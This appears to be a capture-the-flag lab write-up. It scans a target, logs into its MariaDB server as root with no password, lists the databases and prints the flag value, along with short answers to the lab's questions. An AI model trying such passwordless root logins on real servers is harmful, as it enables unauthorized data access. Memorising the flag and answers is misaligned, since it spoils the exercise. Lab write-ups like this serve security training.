# Target Info
Target Machine IP = xx_xxx_xx_xxx

# Solution
1. run nmap scan, 3306
```
○ sudo nmap -sC -sV 10.129.189.128
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 22:06 WIB
NSE Timing: About 97.87% done; ETC: 22:08 (0:00:01 remaining)
Nmap scan report for 10.129.189.128
Host is up (2.4s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 72
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, IgnoreSigpipes, SupportsCompression, ODBCClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, InteractiveClient, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, SupportsTransactions, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: vHAK8s[QbyX0#\(QA/f7
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.61 seconds
```
2. MariaDB
3. -u
4. root
5. *
6. ;
7. check the databases using mysql, htb
```
○ mysql -h 10.129.189.128 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 79
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0,595 sec)

MariaDB [(none)]>
```
8. get the flag
```
MariaDB [htb]> select * from config;

+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (39,329 sec)

MariaDB [htb]>
```

flag = 7b4bec00d1a39e3dd4e021ec3d915da8
